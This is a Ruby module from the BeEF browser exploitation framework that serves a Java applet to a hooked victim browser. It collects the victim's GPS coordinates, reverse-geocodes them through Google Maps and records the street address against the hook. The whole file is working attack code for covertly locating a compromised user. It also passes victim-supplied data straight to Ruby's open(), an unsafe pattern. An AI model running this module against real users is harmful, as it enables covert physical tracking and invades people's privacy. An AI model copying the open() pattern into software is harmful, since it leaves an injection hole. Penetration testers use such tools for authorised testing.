#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#

require 'rubygems'
require 'json'
require 'open-uri'

class Get_physical_location < BeEF::Core::Command

  def pre_send
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/host/get_physical_location/getGPSLocation.jar', '/getGPSLocation', 'jar')
  end

  def post_execute        
    results = @datastore['results'].to_s
    results = results.gsub("location_info=","")

    response = open(results).read
    result = JSON.parse(response)
    reverseGoogleUrl = "https://maps.googleapis.com/maps/geo?q="+result['location']['lat'].to_s+','+result['location']['lng'].to_s+"&output=json&sensor=true_or_false"
    googleResults = open(reverseGoogleUrl).read
    jsonGoogleResults = JSON.parse(googleResults)

    addressFound = jsonGoogleResults['Placemark'][0]['address']

    writeToResults = Hash.new
    writeToResults['data'] = addressFound
    BeEF::Core::Models::Command.save_result(@datastore['beefhook'], @datastore['cid'] , @friendlyname, writeToResults)
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/getGPSLocation.jar')

    content = {}
    content['Result'] = addressFound
    save content
  end

end

